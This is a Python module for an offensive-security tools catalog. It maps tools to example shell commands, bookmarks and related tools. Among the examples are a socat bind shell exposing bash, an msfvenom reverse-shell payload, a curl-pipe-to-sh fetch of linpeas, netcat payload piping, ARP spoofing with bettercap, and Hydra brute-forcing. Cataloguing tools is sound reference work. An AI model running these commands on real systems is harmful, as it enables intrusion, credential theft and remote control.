"""Usage examples, bookmarks & related-tool relations for the tools catalog.

Three optional per-tool metadata enrichments (all deterministic, no network):

  * ``TOOL_USAGE``    — example CLI invocation(s) for a tool
                       (dict: tool name → list[str] of shell examples).
  * ``TOOL_BOOKMARKS``— curated reference links per tool
                       (dict: tool name → list[str] URLs).
  * ``TOOL_RELATED``  — related-tool names (same family / often used together)
                       (dict: tool name → list[str] tool names).

Default modes:
  * ``default_usage(category)``   — a sensible fallback example per category
    when a tool has no curated entry (keeps the catalog self-consistent).
  * ``default_bookmark(tool)``    — falls back to the tool's primary URL.
  * ``related_by_name(tools)``    — pairs tools sharing the same category.

Only SIMPLE examples are curated here — no real fingerprinting is performed.
"""

from __future__ import annotations

# ---------------------------------------------------------------------------
# Curated usage examples (a representative shell command for common tools)
# ---------------------------------------------------------------------------

TOOL_USAGE: dict[str, list[str]] = {
    "Nmap | Zenmap": [
        "nmap -sV -sC -Pn target.example.com",
        "nmap -p 1-65535 -T4 target.example.com -oA scan",
        "zenmap  # GUI wrapper",
    ],
    "theHarvester": [
        "theHarvester -d example.com -b all -l 500",
    ],
    "Sublist3r": [
        "sublist3r -d example.com",
    ],
    "Subfinder": [
        "subfinder -d example.com -all -o subs.txt",
    ],
    "Amass": [
        "amass enum -passive -d example.com",
        "amass intel -whois -d example.com",
    ],
    "MassDNS": [
        "massdns -r resolvers.txt -t A -s 100 subs.txt -o S -w resolved.txt",
    ],
    "Dnsx": [
        "dnsx -l subs.txt -a -resp",
    ],
    "Naabu": [
        "naabu -host example.com -p - -top-ports 100",
    ],
    "RustScan": [
        "rustscan -a 10.0.0.1 -- -sV",
    ],
    "Masscan": [
        "sudo masscan 10.0.0.0/24 -p80,443,22 --rate=1000",
    ],
    "httpX": [
        "httpx -l urls.txt -sc -title -td -o live.txt",
    ],
    "Nuclei": [
        "nuclei -l urls.txt -t cves/ -severity high,critical",
    ],
    "Nikto": [
        "nikto -h https://target.example.com",
    ],
    "Wapiti": [
        "wapiti -u https://target.example.com --scope url",
    ],
    "Arachni": [
        "arachni https://target.example.com --report-save=scan.afr",
    ],
    "Openvas": [
        "gvm-cli --gmp-username admin --gmp-password pass socket --xml <scan.xml>",
    ],
    "ffuf": [
        "ffuf -w wordlist.txt -u https://target/FUZZ",
        "ffuf -w wl.txt -u https://target -X POST -d 'user=FUZZ&pass=x'",
    ],
    "Dirsearch": [
        "dirsearch -u https://target.example.com -e php,html,txt",
    ],
    "Gobuster": [
        "gobuster dir -u https://target -w wordlist.txt",
        "gobuster vhost -u https://target -w vhosts.txt",
    ],
    "Wfuzz": [
        "wfuzz -z file,wordlist.txt -u https://target/FUZZ --hc 404",
    ],
    "WhatWeb": [
        "whatweb -a 3 https://target.example.com",
    ],
    "Wappalyzer": [
        "wappalyzer https://target.example.com --pretty",
    ],
    "Burpsuite": [
        "burpsuite  # then configure browser proxy to 127.0.0.1:8080",
    ],
    "Sqlmap": [
        "sqlmap -u 'https://target/app?id=1' --dbs",
        "sqlmap -u 'https://target/app?id=1' --dump -T users",
    ],
    "NoSQLMap": [
        "nosqlmap --target http://target:8080 --db mongodb",
    ],
    "Hydra": [
        "hydra -l admin -P rockyou.txt ssh://target",
        "hydra -L users.txt -P pass.txt http-post-form '/login:user=^USER^&pass=^PASS^:F=invalid'",
    ],
    "Hashcat": [
        "hashcat -m 0 -a 0 hashes.txt rockyou.txt",
        "hashcat -m 22000 handshake.hc22000 rockyou.txt",
    ],
    "John": [
        "john --wordlist=rockyou.txt hashes.txt",
    ],
    "Medusa": [
        "medusa -h target -U users.txt -P pass.txt -M ssh",
    ],
    "Patator": [
        "patator http_fuzz url=https://target/login method=POST body='user=FILE0&pass=FILE1' 0=users.txt 1=pass.txt",  # noqa: E501
    ],
    "XSStrike": [
        "xssstrike -u https://target/app?id=1",
    ],
    "dalfox": [
        "dalfox url https://target/app?id=1",
    ],
    "BeeF": [
        "beef-xss  # then paste the hook URL into the target page",
    ],
    "Commix": [
        "commix --url https://target/app --data='cmd=ls' --os=linux",
    ],
    "LFIsuite": [
        "lfisuite  # GUI; or python2 lfisuite  (see repo)",
    ],
    "Metasploit": [
        "msfconsole -x 'use exploit/multi/http/struts_content_type_ognl; set RHOSTS target'",  # noqa: E501
        "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf",  # noqa: E501
    ],
    "Empire": [
        "ps-empire server   # or: ./ps-empire client",
    ],
    "WireShark": [
        "tshark -i eth0 -f 'tcp port 80' -w capture.pcap",
        "wireshark capture.pcap",
    ],
    "bettercap": [
        "sudo bettercap -eval 'set arp.spoof.targets 10.0.0.5; arp.spoof on; net.sniff on'",
    ],
    "Responder": [
        "sudo responder -I eth0",
    ],
    "Netcat": [
        "nc -lvnp 4444                    # listener",
        "nc target 4444 < /tmp/payload.sh  # pipe a payload",
    ],
    "Socat": [
        "socat TCP-LISTEN:4444,fork TCP:10.0.0.1:80",
        "socat -d -d TCP-LISTEN:4444 EXEC:'/bin/bash -i'",
    ],
    "Pwncat": [
        "pwncat-catch vps.example.com:4444",
    ],
    "AntSword": [
        "antsword  # then add a webshell (url + password)",
    ],
    "Godzilla": [
        "godzilla.jar  # GUI: add a payload (key + pass) and connect",
    ],
    "PEASS-ng": [
        "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
        "linpeas.sh -a",
    ],
    "Gitleaks": [
        "gitleaks detect --source . --report output.json",
        "gitleaks git --repo-uri https://github.com/acme/repo",
    ],
    "Trivy": [
        "trivy image alpine:latest",
        "trivy fs --scanners vuln,secret .",
    ],
    "osv-scanner": [
        "osv-scanner scan -r .",
    ],
    "Semgrep": [
        "semgrep scan --config=auto .",
    ],
    "Spiderfoot": [
        "spiderfoot -l 127.0.0.1:5001  # web UI on :5001",
    ],
    "Recon-ng": [
        "recon-ng  # then: marketplace install all; use recon/domains-hosts/hackertarget",
    ],
    "Maltego": [
        "maltego  # GUI: start a transform on a domain entity",
    ],
    "GHunt": [
        "python3 ghunt email target@gmail.com  # after configuring a Google cookies file",
    ],
    "Sn1per": [
        "sniper -t https://target.example.com -m web",
    ],
    "GitHound": [
        "githound --dig-paths --many-paths --threads 50 --api-key ghp_xxx seed.txt",
    ],
    "gitGraber": [
        "python3 gitGraber.py -k keywords.txt -q 'org:acme' -d -t ghr_xxx",
    ],
    "Sparta": [
        "sparta -t 10.0.0.1   # starts GUI with nmap integration",
    ],
    "Kali Linux": [
        "sudo apt update && sudo apt install kali-tools-top10",
    ],
    "GHDB": [
        "exploit-db.com/google-hacking-database/  # browse dorks",
    ],
    "SearchSploit": [
        "searchsploit apache 2.4",
        "searchsploit -m 41234  # mirror an exploit to cwd",
    ],
    "DVWA": [
        "docker run --rm -p 80:80 vulnerables/web-dvwa",
    ],
    "WebGoat": [
        "docker run -p 8080:8080 webgoat/goatandwolf",
    ],
}

# ---------------------------------------------------------------------------
# Curated bookmarks (optional reference links; falls back to tool URL)
# ---------------------------------------------------------------------------

TOOL_BOOKMARKS: dict[str, list[str]] = {
    "Nmap | Zenmap": ["https://nmap.org/book/toc.html", "https://nmap.org/nsedoc/"],
    "GHDB": ["https://www.exploit-db.com/google-hacking-database/"],
    "SearchSploit": ["https://www.exploit-db.com/"],
    "GTFOBins": ["https://gtfobins.github.io/"],
    "LOLBAS": ["https://lolbas-project.github.io/"],
    "WADComs": ["https://wadcoms.github.io/"],
    "HijackLibs": ["https://hijacklibs.net/"],
    "KEsc": ["https://github.com/google/osv-scanner"],
    "Spiderfoot": ["https://spiderfoot.net/documentation/"],
    "Metasploit": ["https://docs.metasploit.com/"],
    "Sqlmap": ["https://github.com/sqlmapproject/sqlmap/wiki"],
    "Kali Linux": ["https://kali.org/docs/", "https://www.kali.org/tools/"],
    "Openvas": ["https://greenbone.github.io/docs/latest/"],
    "Vulnhub": ["https://www.vulnhub.com/"],
    "TryHackMe": ["https://tryhackme.com/how-it-works"],
    "Hackthebox": ["https://www.hackthebox.com/"],
    "Web Security Academy": ["https://portswigger.net/web-security"],
    "Awesome-POC": ["https://github.com/Threekiii/Awesome-POC"],
}

# ---------------------------------------------------------------------------
# Related tools (by family / typical usage together)
# ---------------------------------------------------------------------------

TOOL_RELATED: dict[str, list[str]] = {
    # recon / subdomain family
    "Sublist3r": ["Subfinder", "Amass", "MassDNS", "OneForAll"],
    "Subfinder": ["Sublist3r", "Amass", "MassDNS"],
    "Amass": ["Subfinder", "Sublist3r", "theHarvester"],
    "MassDNS": ["Subfinder", "Sublist3r", "dnscan"],
    "OneForAll": ["Sublist3r", "Subfinder", "Amass"],
    "Masscan": ["Nmap | Zenmap", "Naabu", "RustScan"],
    "Nmap | Zenmap": ["Masscan", "Naabu", "RustScan", "Goby"],
    "Naabu": ["httpx", "Nmap | Zenmap", "Masscan"],
    "RustScan": ["Nmap | Zenmap", "Masscan", "Naabu"],
    "Dnsx": ["Subfinder", "MassDNS", "Naabu"],
    "whois": ["Amass", "theHarvester"],
    # vuln scanning triangle
    "httpx": ["Nuclei", "Naabu", "Subfinder"],
    "Nuclei": ["httpx", "httpX", "Naabu"],
    "Arachni": ["Wapiti", "Openvas", "Nikto"],
    "Wapiti": ["Arachni", "Nikto", "Sqlmap"],
    "Nikto": ["Nuclei", "Wapiti", "httpX"],
    # path discovery family
    "ffuf": ["Dirsearch", "Gobuster", "wfuzz"],
    "Dirsearch": ["ffuf", "Gobuster", "Dirmap"],
    "Gobuster": ["ffuf", "Dirsearch", "wfuzz"],
    "wfuzz": ["ffuf", "Gobuster", "Dirsearch"],
    # web proxies
    "Burpsuite": ["ZAP", "Mitmproxy", "Hack-Tools"],
    "ZAP": ["Burpsuite", "Mitmproxy", "Arachni"],
    "Mitmproxy": ["Burpsuite", "ZAP", "Proxify"],
    # payload / injection family
    "Sqlmap": ["NoSQLMap", "Commix", "Advanced-SQL-Injection-Cheatsheet"],
    "XSStrike": ["dalfox", "BeeF", "PwnXSS"],
    "dalfox": ["XSStrike", "Xenotix", "PwnXSS"],
    "Commix": ["Sqlmap", "Shellfire", "Goshell"],
    # password cracking family
    "Hashcat": ["John", "Hydra", "Patator", "Medusa"],
    "John": ["Hashcat", "Hydra", "Patator"],
    "Hydra": ["Medusa", "Patator", "crowbar"],
    "Patator": ["Hydra", "Medusa", "crowbar"],
    # sniffing / MITM
    "Responder": ["bettercap", "Cain & abel", "EvilFOCA", "WireShark"],
    "bettercap": ["Responder", "EvilFOCA", "WireShark"],
    "WireShark": ["bettercap", "Responder", "Cain & abel"],
    # shells + listeners
    "Netcat": ["Socat", "Pwncat", "Powercat"],
    "Socat": ["Netcat", "Pwncat", "Powercat"],
    "Pwncat": ["Netcat", "Socat", "Powercat"],
    # webshells
    "Godzilla": ["Behinder", "AntSword", "Weevely3"],
    "Behinder": ["Godzilla", "AntSword", "Skyscorpion"],
    "AntSword": ["Godzilla", "Behinder", "CKnife"],
    # tunneling
    "Frp": ["Nps", "EarthWorm", "Stowaway"],
    "Nps": ["Frp", "Neo-reGeorg", "Stowaway"],
    "ReGeorg": ["Neo-reGeorg", "Suo5", "Frp"],
    "Neo-reGeorg": ["ReGeorg", "Suo5", "Nps"],
    # C2
    "Sliver": ["Covenant", "Havoc", "Empire"],
    "Covenant": ["Sliver", "Havoc", "Starkiller"],
    "Havoc": ["Sliver", "Covenant", "Empire"],
    "Empire": ["Sliver", "Starkiller", "Viper"],
    "Metasploit": ["Empire", "Covenant", "Havoc", "Sliver"],
    # privesc
    "GTFOBins": ["GTFOBLookup", "LOLBAS", "PEASS-ng"],
    "LOLBAS": ["WADComs", "HijackLibs", "GTFOBins"],
    "PEASS-ng": ["GTFOBins", "linux-exploit-suggester-2", "BeRoot"],
    # OSINT
    "Spiderfoot": ["Maltego", "Recon-ng", "theHarvester"],
    "Recon-ng": ["Spiderfoot", "Maltego", "theHarvester"],
    "Maltego": ["Spiderfoot", "Recon-ng", "Intrigue"],
    "theHarvester": ["Amass", "Subfinder", "EmailHarvester"],
    # CMS fingerprint
    "WhatWeb": ["Wappalyzer", "CMSeeK", "EHole"],
    "Wappalyzer": ["WhatWeb", "Whatruns", "ObserverWard"],
    "CMSeeK": ["WhatCMS", "EHole", "WhatWeb"],
    # code audit
    "Semgrep": ["Graudit", "Kunlun-M", "Rips"],
    "Graudit": ["Semgrep", "Rips", "Kunlun-M"],
    "Gitleaks": ["osv-scanner", "Trivy", "DevAudit"],
    "Trivy": ["osv-scanner", "Gitleaks", "DevAudit"],
    # singleton-category tools (no same-category sibling) get curated relations
    "Hack-Tools": ["Burpsuite", "ZAP", "Mitmproxy"],
    "Ollydbg": ["Godzilla", "Behinder", "dnSpy"],
    "Deemon": ["Burpsuite", "ZAP", "Arachni"],
    "Keyscope": ["Gitleaks", "GitHound", "gitGraber"],
    # distribution
    "Kali Linux": ["Parrot Security", "BlackArch Linux", "Backbox Linux"],
    "Parrot Security": ["Kali Linux", "BlackArch Linux", "ArchStrike"],
    # cyber range
    "DVWA": ["WebGoat", "BWAPP", "XVWA"],
    "WebGoat": ["DVWA", "BWAPP", "Web Security Academy"],
}


# ---------------------------------------------------------------------------
# Deterministic fallbacks (keeps every tool fully enriched without per-tool data)
# ---------------------------------------------------------------------------

# Fallback usage per category — used when no curated TOOL_USAGE entry exists.
_CATEGORY_USAGE: dict[str, str] = {
    "recon": "<tool> -h   # or: <tool> target.example.com",
    "osint": "<tool> --target example.com   # passive collection",
    "vuln-scan": "<tool> -u https://target.example.com",
    "webapp-cms": "<tool> https://target.example.com",
    "webapp-proxy": "<tool>   # start proxy, point browser at 127.0.0.1:8080",
    "webapp-browser": "<tool>   # install the browser extension on the target tab",
    "webapp-crawler": "<tool> -u https://target.example.com -w wordlist.txt",
    "database": "<tool> --host dbhost --user sa --password <pw>",
    "password": "<tool> -l <user> -P <wordlist> <target>",
    "wireless": "sudo <tool>     # requires monitor-mode adapter",
    "exploit-search": "<tool> <keyword or CVE>",
    "xss": "<tool> -u 'https://target/app?q=1'",
    "sqli": "<tool> -u 'https://target/app?id=1'",
    "command-injection": "<tool> --url https://target/app --method GET --param cmd",
    "file-include": "<tool> -u 'https://target/index.php?page=1'",
    "xxe": "<tool> -u https://target --oob-server 10.0.0.1",
    "csrf": "<tool> -u https://target.example.com",
    "exploit-framework": "<tool>   # then: use <module>; run",
    "sniffing": "sudo <tool> -i <iface>",
    "shell": "<tool>   # start a listener / generate payload",
    "webshell": "<tool>   # add a shell (URL + password) and connect",
    "privesc": "python3 <tool> /  bash <tool>.sh  # run on the target",
    "c2": "<tool>   # start the server, then stage an agent",
    "bypass-av": "<tool> -i payload.elf -o clean.exe",
    "tunnel": "<tool> -s <server> -p 7000 -r <remote-port>",
    "reporting": "<tool>   # start the collaboration server",
    "secret": "<tool> scan <target-key-or-service>",
    "code-audit": "<tool> <path/to/project>",
    "devsecops": "<tool> scan .",
    "reverse-engineering": "<tool> <binary>",
    "rootkit": "<tool>   # build & install on the (authorized) target",
    "distribution": "<tool>   # boot the live media; then use included tools",
    "cyber-range": "<tool>   # open the lab and follow the tutorial",
    "collections": "<tool>   # browse the inventory",
}

# Fallback related-relation: tools sharing the same category are presented as
# "related" (computed in tools_catalog), so TOOL_RELATED only needs the curated
# cross-family relations above.


def default_usage(category: str) -> list[str]:
    """Deterministic fallback invocation for an unknown tool of a category."""
    return [_CATEGORY_USAGE.get(category, "<tool> --help")]


def curated_usage(name: str) -> list[str]:
    return list(TOOL_USAGE.get(name, []))


def curated_bookmarks(name: str) -> list[str]:
    return list(TOOL_BOOKMARKS.get(name, []))


def curated_related(name: str) -> list[str]:
    return list(TOOL_RELATED.get(name, []))


__all__ = [
    "TOOL_USAGE",
    "TOOL_BOOKMARKS",
    "TOOL_RELATED",
    "default_usage",
    "curated_usage",
    "curated_bookmarks",
    "curated_related",
]
